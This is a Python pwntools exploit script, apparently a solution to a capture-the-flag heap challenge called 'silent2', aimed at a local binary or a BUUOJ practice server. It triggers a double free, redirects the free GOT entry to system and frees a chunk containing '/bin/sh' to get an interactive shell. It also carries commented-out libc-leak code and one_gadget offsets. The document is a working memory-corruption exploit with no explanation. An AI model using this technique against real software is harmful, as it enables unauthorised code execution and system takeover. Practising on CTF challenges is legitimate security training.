#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./silent2'
#context.arch='amd64'
while True :
	# try :
		elf=ELF(elfelf)
		context.arch=elf.arch

		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]

		else :
			io=remote('node4.buuoj.cn',29175)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		def add(a,b):
			io.sendline('1')
			sleep(0.1)
			io.sendline(str(a))
			sleep(0.1)
			io.send(b)
			sleep(0.1)

		def edit(a,b):
			io.send('3')
			sleep(0.1)
			io.sendline(str(a))
			sleep(0.1)
			io.send(b)
			sleep(0.1)

		def delete(a):
			io.sendline('2')
			sleep(0.1)
			io.sendline(str(a))
			sleep(0.1)

		add(0x80,'aaaa')
		delete(0)
		delete(0)
		add(0x80,p64(elf.got['free']))
		add(0x80,'/bin/sh\x00')
		add(0x80,p64(elf.plt['system']))
		delete(2)



		
		
		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		
		# success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue